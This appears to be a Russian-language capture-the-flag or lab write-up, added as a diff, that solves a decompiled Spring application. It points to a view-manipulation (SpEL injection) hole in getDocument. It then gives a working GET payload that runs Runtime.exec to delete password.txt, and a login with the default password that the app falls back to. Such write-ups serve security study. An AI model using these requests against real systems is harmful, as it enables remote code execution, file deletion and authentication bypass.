@@ -1,0 +1,3 @@
+В декомпилированном приложении видимо, что метод getDocument не возвращает значения, с помощью гугла можно понять, что этот метод уязвим к View Manipulation Vulnerability (https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability), код можно выполнить через GET http://192.168.12.13:8090/doc/__${code here}__::.x. Метод login читает adminPassword из файла password.txt, но если его нет, adminPassword равняется password. Можно удалить password.txt и залогиниться с паролем password.
+1) GET http://192.168.12.13:8090/doc/__$%7BT(java.lang.Runtime).getRuntime().exec(%22rm%20password.txt%22)%7D__::.x
+2) GET http://192.168.12.13:8090/login?password=password
